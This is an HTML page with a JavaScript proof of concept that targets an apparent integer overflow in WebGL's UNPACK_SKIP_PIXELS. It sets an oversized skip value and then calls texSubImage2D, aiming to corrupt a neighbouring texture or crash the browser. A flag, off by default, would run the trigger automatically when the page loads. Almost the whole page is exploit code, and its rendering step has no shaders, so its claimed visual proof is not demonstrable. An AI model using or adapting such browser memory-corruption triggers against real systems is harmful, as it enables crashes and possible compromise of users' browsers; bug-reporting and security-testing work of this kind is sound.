<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>WebGL UNPACK_SKIP_PIXELS PoC</title>
<style>
  body { background:#111; color:#eee; font-family:monospace; }
  canvas { border:1px solid #555; image-rendering: pixelated; }
</style>
</head>
<body>

<h3>WebGL UNPACK_SKIP_PIXELS PoC</h3>
<canvas id="c" width="64" height="64"></canvas>

<script>
/*
 PoC for WebGL UNPACK_SKIP_PIXELS integer overflow
 Expected (safe): only Attack texture changes
 Buggy behavior: Victim texture corrupted (or ASan crash)
*/

const AUTO_TRIGGER = false; // <-- لاحقاً على الحاسوب اجعلها true

const canvas = document.getElementById("c");
const gl = canvas.getContext("webgl", { preserveDrawingBuffer: true });

if (!gl) {
  console.log("[PoC] WebGL not available");
  throw new Error("WebGL not available");
}

console.log("[PoC] WebGL initialized");

// ---------- helpers ----------
function makeTexture(r, g, b, a) {
  const tex = gl.createTexture();
  gl.bindTexture(gl.TEXTURE_2D, tex);
  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
  gl.texImage2D(
    gl.TEXTURE_2D,
    0,
    gl.RGBA,
    1,
    1,
    0,
    gl.RGBA,
    gl.UNSIGNED_BYTE,
    new Uint8Array([r, g, b, a])
  );
  return tex;
}

// ---------- setup ----------
console.log("[PoC] Creating victim texture (RED)");
const victimTex = makeTexture(255, 0, 0, 255);

console.log("[PoC] Creating attack texture (BLACK)");
const attackTex = makeTexture(0, 0, 0, 255);

// ---------- trigger ----------
function trigger() {
  console.log("[PoC] trigger started");

  const overflowValue = 0x3FFFFFFF; // *4 => 0xFFFFFFFC => -4 (signed)
  console.log("[PoC] Setting UNPACK_SKIP_PIXELS =", overflowValue);

  gl.pixelStorei(gl.UNPACK_SKIP_PIXELS, overflowValue);

  console.log("[PoC] Calling texSubImage2D (GREEN)");
  gl.bindTexture(gl.TEXTURE_2D, attackTex);
  gl.texSubImage2D(
    gl.TEXTURE_2D,
    0,
    0,
    0,
    1,
    1,
    gl.RGBA,
    gl.UNSIGNED_BYTE,
    new Uint8Array([0, 255, 0, 255])
  );

  console.log("[PoC] texSubImage2D finished");
}

// ---------- render (visual proof) ----------
function draw() {
  gl.clearColor(0.0, 0.0, 1.0, 1.0); // blue background
  gl.clear(gl.COLOR_BUFFER_BIT);

  // We don't need real shaders here for the PoC logic.
  // Visual corruption / ASan crash is the proof.
}

draw();

if (AUTO_TRIGGER) {
  trigger();
} else {
  console.log("[PoC] AUTO_TRIGGER disabled (safe mode)");
  console.log("[PoC] Enable AUTO_TRIGGER on desktop test environment");
}
</script>

</body>
</html>
